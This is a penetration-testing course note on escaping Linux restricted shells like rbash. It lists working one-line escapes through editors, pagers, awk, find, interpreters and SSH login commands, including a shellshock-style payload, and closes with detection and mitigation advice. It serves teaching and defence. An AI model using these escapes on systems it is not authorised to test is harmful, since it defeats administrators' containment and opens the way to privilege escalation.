---
tags: [linux, privesc, restricted-shell, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.41 Restricted Shell Escape"
---

# Restricted Shell Escape

## Introduction
A **restricted shell** (`rbash`, `rksh`, `lshell`, or a custom menu/jail) limits what a user can do: no changing directory, no setting `PATH`/`SHELL`, no executing programs with a `/` in the name, no output redirection. Administrators use them for kiosk accounts, SFTP/SSH "menu" users, network-appliance CLIs, and bastion logins. For an attacker, landing in a restricted shell is a containment to **break out of** before any normal enumeration or privesc is possible. The goal of restricted-shell escape is to obtain an **unrestricted shell** as the same user; from there, the rest of this module applies.

## What Restricted Shells Block (and the Gaps)
```text
+---------------------------------------------------------------+
|              TYPICAL rbash RESTRICTIONS                      |
+---------------------------------------------------------------+
|  X  cd                          |  X  redirect > >>            |
|  X  set/modify PATH SHELL ENV   |  X  run cmd containing '/'   |
|  X  exec by absolute path       |                              |
+---------------------------------------------------------------+
|  GAP: anything that spawns a NEW, unrestricted shell from     |
|  WITHIN an allowed program escapes the jail (the restriction  |
|  is on the rbash process, not its children).                  |
+---------------------------------------------------------------+
```
The escape principle is almost always: **find an allowed program that can spawn a subshell or run a command**, and use it to launch `/bin/bash` (or `bash` once PATH is fixed) without the restricted flag.

## Escape Techniques
### 1. Subshells from allowed interpreters/editors
If any of these are permitted, they can shell out:
```bash
# vi/vim
:!/bin/bash        # or  :set shell=/bin/bash | :shell
# less / man / more (pager shell escape)
!/bin/bash         # while viewing a file
# awk
awk 'BEGIN {system("/bin/bash")}'
# find
find / -name x -exec /bin/bash \;
# nmap (interactive, old versions)
nmap --interactive  -> !sh
# language interpreters
python3 -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
# ssh ProxyCommand / built-in escapes
ssh user@host -t "/bin/bash"
```
GTFOBins catalogs the "shell" / "command" capability for hundreds of binaries — check whatever the restricted shell *does* allow against it.

### 2. Escaping via SSH at login
If the restricted shell is set as the SSH login shell, you may bypass it before it runs:
```bash
ssh user@host -t "bash --noprofile"     # request a different command/shell
ssh user@host "/bin/sh"                 # run a command instead of the login shell
ssh user@host -t "() { :; }; /bin/bash" # (historic shellshock-style)
```

### 3. Fixing PATH / using allowed builtins
If you can set environment from the *parent* (e.g. via SSH `SetEnv`, or the shell didn't lock `BASH_CMDS`/`PATH` early), or if `export -p` shows a writable PATH window, you can reintroduce binaries:
```bash
export PATH=/bin:/usr/bin   # if not blocked
# rbash blocks names with '/', but PATH-resolved names work:
bash
```

### 4. Copying binaries you ARE allowed to run
If the restricted shell allows a benign binary in a writable directory, replace/symlink it (PATH-permitting) to point at `bash`.

## Post-Escape
Confirm you have an unrestricted shell, then stabilise and enumerate:
```bash
echo $SHELL; echo $0
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# now run normal enumeration (see note 02) toward root
```

## Why It Matters in an Engagement
Restricted shells front many real targets: SFTP-only accounts, network-device CLIs, jump-host menu users. They give defenders a false sense of containment because the restriction is applied to a single shell process and is trivially escaped through almost any allowed program that can spawn a child. Escaping is usually step zero on these footholds.

## Detection and Mitigation
- Don't rely on `rbash` alone for security boundaries; combine with a locked-down `PATH` pointing to a directory containing **only** vetted, non-shelling binaries (no editors, interpreters, `find`, `awk`, pagers).
- Prefer real isolation: `ForceCommand` + `chroot`/`ChrootDirectory` for SFTP, containers, or seccomp/AppArmor confinement.
- Remove interpreters and GTFOBins-capable tools from restricted accounts; monitor for child shells of restricted-shell sessions.

## Chaining Opportunities
- Escape → full enumeration ([[02 - Enumeration Tools]]) → any privesc in this module.
- Tools-capability lookups overlap with [[34 - Logrotate Exploitation]]-style "abuse an allowed tool" thinking and GTFOBins ([[03 - SUID Binaries Abuse]] uses the same source).

## Related Notes
- [[02 - Enumeration Tools]]
- [[03 - SUID Binaries Abuse]]
- [[06 - Sudo Misconfigurations]]
- [[01 - Linux PrivEsc Methodology Overview]]
